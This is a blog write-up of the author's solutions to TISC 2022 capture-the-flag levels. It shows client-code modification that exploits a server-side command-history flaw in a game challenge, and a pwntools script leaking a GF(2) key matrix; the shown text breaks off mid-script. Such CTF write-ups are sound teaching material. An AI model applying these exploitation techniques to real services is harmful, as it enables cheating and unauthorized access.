<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>TISC 2022 | a rant of my adventures</title>
<meta property="og:title" content="TISC 2022 | a rant of my adventures"><meta name=twitter:title content="TISC 2022 | a rant of my adventures"><meta itemprop=name content="TISC 2022 | a rant of my adventures"><meta name=application-name content="TISC 2022 | a rant of my adventures"><meta property="og:site_name" content="a rant of my adventures"><meta name=description content="The Information Security Challenge 2022"><meta itemprop=description content="The Information Security Challenge 2022"><meta property="og:description" content="The Information Security Challenge 2022"><meta name=twitter:description content="The Information Security Challenge 2022"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><meta itemprop=image content="https://blog.caprinux.com"><meta property="og:image" content="https://blog.caprinux.com"><meta name=twitter:image content="https://blog.caprinux.com"><meta name=twitter:image:src content="https://blog.caprinux.com"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2022-09-10T00:00:00Z"><meta property="article:published_time" content="2022-09-10T00:00:00Z"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"TISC 2022","author":{"@type":"Person","name":""},"datePublished":"2022-09-10","description":"The Information Security Challenge 2022","wordCount":6543,"mainEntityOfPage":"True","dateModified":"2022-09-10","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"a rant of my adventures"}}</script><meta name=generator content="Hugo 0.121.1"><link rel=canonical href=https://blog.caprinux.com/posts/ctfs/2022/tisc-2022/><link href=/style.min.5d415e34e927589b6ad5fe83ea6f8006479d2d6c2fa7897ee14c54c5618ba634.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://blog.caprinux.com/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://blog.caprinux.com/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/pages/about/>About</a></li><li class=menu-separator><span></span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>TISC 2022</h1><div class=post-meta><time datetime=2022-09-10T00:00:00+00:00 itemprop=datePublished>10 Sep 2022</time></div></header><details class=toc open><summary><b>Table of Contents</b></summary><nav id=TableOfContents><ul><li><a href=#level-1-slay-the-dragon>LEVEL 1: Slay The Dragon</a><ul><li><a href=#basic-analysis-of-the-game>Basic Analysis of the Game</a><ul><li><a href=#fight-a-boss>Fight A Boss</a></li><li><a href=#mine-gold>Mine Gold</a></li><li><a href=#visit-shop>Visit Shop</a></li></ul></li><li><a href=#exploiting-the-game>Exploiting the Game</a></li></ul></li><li><a href=#level-2---leaky-matrices>LEVEL 2 - Leaky Matrices</a><ul><li><a href=#figuring-out-wthek-is-going-on>Figuring out wthek is going on</a></li><li><a href=#guessing-to-the-solution>Guessing to the solution</a></li></ul></li><li><a href=#level-3---patient0>LEVEL 3 - PATIENT0</a><ul><li><a href=#part-1>Part 1</a></li><li><a href=#part-2>Part 2</a></li></ul></li><li><a href=#level-4a---one-knock-away>LEVEL 4A - One Knock Away</a><ul><li><a href=#reverse-engineering-our-kernel-module>Reverse Engineering our kernel module</a></li><li><a href=#trying-to-get-the-flag>Trying to get the flag</a></li></ul></li><li><a href=#level-5a---morbed-morphed-morbed>LEVEL 5A - Morbed, Morphed, Morbed</a></li><li><a href=#level-6---pwnlindrome>LEVEL 6 - Pwnlindrome</a></li></ul></nav></details><div class=page-content><h1 id=the-challenge>The Challenge</h1><hr><p>The <strong>Information Security Challenge</strong> (TISC) is an annual Capture The Flag (CTF) competition hosted by the Centre for Strategic Infocomm Technologies (CSIT) in Singapore.</p><p>The CTF features a series of 10 levels over the span of 2 weeks, covering various CTF topics including, but not limited to, <strong>Web Pen-testing, Forensics, Reverse Engineering, Binary Exploitation, Cryptography,</strong> and <strong>Mobile Security</strong>.</p><p>In order to unlock levels, you had to clear all the levels before. At level 4 and 5, a choice was given to the participants to pick between RE or Cloud/Web challenges. I opted for the RE challenges which my writeup below will cover.</p><p>The CTF also featured a total prize pool of <strong>$30,000SGD</strong> for participants who solved level 8 and above.</p><p>Although I managed to quickly climb the leaderboard to stay in 1st place for majority of the CTF, I eventually got hardstuck at 7 and finished at 5th place.</p><p><img src=attachments/scoreboard.png alt=image></p><p><em>p.s. this writeup is not an exact representation of my thought process and steps taken to solve the challenges mentioned. it is merely a much more simplified and bite-sized summary to guide the reader through my solution</em></p><h2 id=level-1-slay-the-dragon>LEVEL 1: Slay The Dragon</h2><hr><p><img src=attachments/1/level1_screenshot.png alt=image></p><p><em>Files attached:</em> <a href=attachments/1/slay_the_dragon.zip>slay_the_dragon.zip</a></p><h3 id=basic-analysis-of-the-game>Basic Analysis of the Game</h3><p>Upon running the program provided to us, we are presented with a menu in a game.</p><p><img src=attachments/1/game_default_1.png alt=image></p><p>As a player, we are allowed to <strong>FIGHT A BOSS</strong>, <strong>MINE GOLD</strong> or <strong>VISIT SHOP</strong>.</p><h4 id=fight-a-boss>Fight A Boss</h4><p>We as a player <em>(with 10 HP)</em> have to defeat 3 bosses <em>(slime, wolf and dragon)</em> in order to win the game and get the flag.</p><p>Naturally, defeating the boss by normal means is <em>impossible</em> as the dragon will one-shot you.</p><h4 id=mine-gold>Mine Gold</h4><p>It takes around 5 seconds to mine 5 gold, with a small probability of dying to a creeper explosion.</p><h4 id=visit-shop>Visit Shop</h4><p>We can purchase a sword which increase our attack from 1 to 3. The damage does not stack even with multiple swords.</p><p>We can also purchase a health potion which increase our HP by a small fraction.</p><p> </p><h3 id=exploiting-the-game>Exploiting the Game</h3><p>Some people will immediately jump to try to call functions such as <strong>print_flag</strong> or increase the damage of the player by 10000. However, it is not so simple.</p><p>Looking into the source code, how the game works behind the scenes is that the client will send a bunch of data <em>(corresponding to the user&rsquo;s actions)</em> to the server, and the server may <strong>validate</strong> the data sent by the client.</p><p>If we look at the source code for the mining event for example,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># server side mining code</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>WorkService</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>server</span><span class=p>:</span> <span class=n>GameServer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>server</span> <span class=o>=</span> <span class=n>server</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>server</span><span class=o>.</span><span class=n>game</span><span class=o>.</span><span class=n>player</span><span class=o>.</span><span class=n>gold</span> <span class=o>+=</span> <span class=n>WORK_SALARY</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># client side mining code</span>
</span></span><span class=line><span class=cl><span class=n>CREEPER_ENCOUNTER_CHANCE</span> <span class=o>=</span> <span class=mf>0.2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>WorkEvent</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>client</span><span class=p>:</span> <span class=n>GameClient</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>client</span> <span class=o>=</span> <span class=n>client</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>random</span><span class=p>()</span> <span class=o>&lt;=</span> <span class=n>CREEPER_ENCOUNTER_CHANCE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>__die_to_creeper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>__mine_safely</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>__mine_safely</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>screens</span><span class=o>.</span><span class=n>display_working_screen</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;how many mine?&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>send_command</span><span class=p>(</span><span class=n>Command</span><span class=o>.</span><span class=n>WORK</span><span class=p>)</span>
</span></span></code></pre></div><p>We can see that the long wait time for mining for gold is due to the client side code <code>display_working-screen()</code> and is not enforced on the server side. This is the same for the <strong>chance to encounter a creeper</strong>.</p><p>This means we can simply comment out these lines to get as much gold as we want easily without waiting or dying.</p><p>However, this is trivial and does not help us to defeat the dragon. Let&rsquo;s get straight to the juice of the challenge which is the battle event.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># client side code</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>__display</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=bp>self</span><span class=o>.</span><span class=n>__get_battle_command</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>ATTACK</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>__attack_boss</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>boss</span><span class=o>.</span><span class=n>is_dead</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>HEAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>__use_potion</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>RUN</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>send_command</span><span class=p>(</span><span class=n>Command</span><span class=o>.</span><span class=n>RUN</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>_</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>player</span><span class=o>.</span><span class=n>receive_attack_from</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>boss</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>player</span><span class=o>.</span><span class=n>is_dead</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=bp>self</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>send_command</span><span class=p>(</span><span class=n>Command</span><span class=o>.</span><span class=n>VALIDATE</span><span class=p>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=bp>self</span><span class=o>.</span><span class=n>__send_next_boss</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>history</span><span class=o>.</span><span class=n>log_commands_from_str</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>server</span><span class=o>.</span><span class=n>recv_command_str</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=bp>self</span><span class=o>.</span><span class=n>history</span><span class=o>.</span><span class=n>latest</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>ATTACK</span> <span class=o>|</span> <span class=n>Command</span><span class=o>.</span><span class=n>HEAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>history</span><span class=o>.</span><span class=n>log_command</span><span class=p>(</span><span class=n>Command</span><span class=o>.</span><span class=n>BOSS_ATTACK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>VALIDATE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>RUN</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=n>_</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>server</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>match</span> <span class=bp>self</span><span class=o>.</span><span class=n>__compute_battle_outcome</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=n>Result</span><span class=o>.</span><span class=n>PLAYER_WIN_BATTLE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>__handle_battle_win</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=n>Result</span><span class=o>.</span><span class=n>BOSS_WIN_BATTLE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>server</span><span class=o>.</span><span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=n>_</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>server</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>As we can see, the outcome of the battle is determined through a <code>stack-like</code> history structure.</p><p>The client send some <strong>Commands</strong> to the server-side, which upon receiving, the server will add to their history.</p><p>The server will then check the latest entry in the history to determine whether the boss should attack or not. How it works goes like this:</p><ol><li>Client sends a Command.ATTACK to the server.</li><li>The server receives the Command and add it to the history.</li><li>The server will check the <strong>last</strong> entry of the history and determine that the boss should return an attack. Hence it will add a <strong>BOSS_ATTACK</strong> to the history.</li><li>After the battle has ended, the server will iterate through the history to determine the outcome.</li></ol><p>So far, the code looks clean and logical. Let&rsquo;s look into the code behind the logging.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>class</span> <span class=nc>Command</span><span class=p>(</span><span class=n>Enum</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ATTACK</span> <span class=o>=</span> <span class=s2>&#34;ATTACK&#34;</span>
</span></span><span class=line><span class=cl>	<span class=c1>#...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dataclass</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>CommandHistorian</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>commands</span><span class=p>:</span> <span class=n>List</span><span class=p>[</span><span class=n>Command</span><span class=p>]</span> <span class=o>=</span> <span class=n>field</span><span class=p>(</span><span class=n>default_factory</span><span class=o>=</span><span class=nb>list</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>log_command</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>command</span><span class=p>:</span> <span class=n>Command</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>commands</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>log_commands</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>commands</span><span class=p>:</span> <span class=n>List</span><span class=p>[</span><span class=n>Command</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>commands</span><span class=o>.</span><span class=n>extend</span><span class=p>(</span><span class=n>commands</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>log_command_from_str</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>command_str</span><span class=p>:</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>log_command</span><span class=p>(</span><span class=n>Command</span><span class=p>(</span><span class=n>command_str</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>log_commands_from_str</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>commands_str</span><span class=p>:</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>log_commands</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=n>Command</span><span class=p>(</span><span class=n>command_str</span><span class=p>)</span> <span class=k>for</span> <span class=n>command_str</span> <span class=ow>in</span> <span class=n>commands_str</span><span class=o>.</span><span class=n>split</span><span class=p>()]</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span></code></pre></div><p>Interestingly, the <code>log_commands_from_str</code> function that was used by the server to get the user command reads in <strong>multiple commands</strong> at once, delimited by a whitespace, and concatenates it to the history.</p><p>The flaw here is that since the server only checks the <strong>last</strong> command in the history to determine whether the boss should attack, we can send multiple <strong>ATTACK</strong> commands, and the boss will only attack us once.</p><p>Hence, if we send enough <strong>ATTACK</strong> to kill the boss before it gets to attack us back, we will win the game.</p><p>This can be easily done by modifying the script slightly.</p><p>We will just change our client battle service code to the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>boss</span><span class=p>:</span> <span class=n>Boss</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>fetch_next_boss</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>__display</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>match</span> <span class=bp>self</span><span class=o>.</span><span class=n>__get_battle_command</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>ATTACK</span><span class=p>:</span>
</span></span><span class=line><span class=cl>					<span class=c1># attack hundred times to kill dragon before it kills us</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>connection</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;ATTACK &#34;</span><span class=o>*</span><span class=mi>100</span> <span class=o>+</span> <span class=s2>&#34;ATTACK&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>HEAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>__use_potion</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>Command</span><span class=o>.</span><span class=n>RUN</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>client</span><span class=o>.</span><span class=n>send_command</span><span class=p>(</span><span class=n>Command</span><span class=o>.</span><span class=n>RUN</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>_</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>player</span><span class=o>.</span><span class=n>receive_attack_from</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>boss</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>player</span><span class=o>.</span><span class=n>is_dead</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span></code></pre></div><p>With that, we can easily run the script and get our flag.</p><p><code>TISC{L3T5_M33T_4G41N_1N_500_Y34R5_96eef57b46a6db572c08eef5f1924bc3}</code></p><h2 id=level-2---leaky-matrices>LEVEL 2 - Leaky Matrices</h2><p><img src=attachments/2/challenge_2_desc.png alt=image></p><p><em>Attached File:</em> <a href=attachments/2/2WKV_Whitepaper.pdf>2WKV_Whitepaper.pdf</a></p><p><em>lol, crypto is my worst category but let&rsquo;s get into it anyways</em></p><h3 id=figuring-out-wthek-is-going-on>Figuring out wthek is going on</h3><blockquote><p>2WKV operates on the basis of
symmetric key cryptography. A 64 bit
key must be securely generated and
distributed to both endpoints before
the algorithm can per form any
verification. This 64 bit key represents
the 8×8 binary matrix that will be used
to perform mathematical operations
in GF(2) during the Key Verification
procedures.</p></blockquote><p><img src=attachments/2/crapto.png alt=image></p><p>With a little googling, we can find a <a href=https://en.wikipedia.org/wiki/GF(2)>wikipedia page</a> and see that GF(2) simply means that we will be working with binary arithmetic (addition/multiplication).</p><p>By playing around with the service a litte, we see that it takes in 8 binary (0 or 1) of length 8, and returns a corresponding length 8 binary string.</p><p>It then challenges us by giving us some binary and asking us for our answer.</p><p>The server essentially generates a random 8*8 matrix as the key and use the key for the server to verity the client vice versa.</p><p>With a little thinking, we probably would&rsquo;ve to <strong>leak</strong> something <em>(as hinted by the challenge name)</em> in our first 8 inputs, and then solve the challenges given to us based on what we have leaked.</p><h3 id=guessing-to-the-solution>Guessing to the solution</h3><p>Honestly, after looking at everything, my brain was still empty <em>(noob mather)</em> but an idea came to me.</p><p>If I have 8 inputs of length 8, could I possibly leak something that corresponds with each bit <em>(sound something like masking)</em> and see what I can do with it?</p><p>At this point, I was willing to try anything to avoid having to think of math so that&rsquo;s what I did.</p><p>I inputted 8 inputs with only one bit enabled for each input and recorded the corresponding output:</p><pre tabindex=0><code>00000001 -&gt; 11101010
00000010 -&gt; 01110001
00000100 -&gt; 01010111
00001000 -&gt; 10001000
00010000 -&gt; 00010101 
00100000 -&gt; 00100010
01000000 -&gt; 10000111
10000000 -&gt; 10111001
</code></pre><p>Then I was challenged to return a correct response vector for the challenge <code>01111100</code>.</p><p>I decided to try to take the corresponding output vector to each bit and add them up together.</p><pre tabindex=0><code>For the challenge vector 01111100,

00000100 -&gt; 01010111
00001000 -&gt; 10001000
00010000 -&gt; 00010101 
00100000 -&gt; 00100010
01000000 -&gt; 10000111

10000111 + 00100010 + 00010101 + 10001000 + 01010111 = 01101111
</code></pre><p>and it magically worked!!!</p><p>I then decided to automate it with pwntools.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg&#39;</span><span class=p>,</span> <span class=mi>56765</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>arr</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
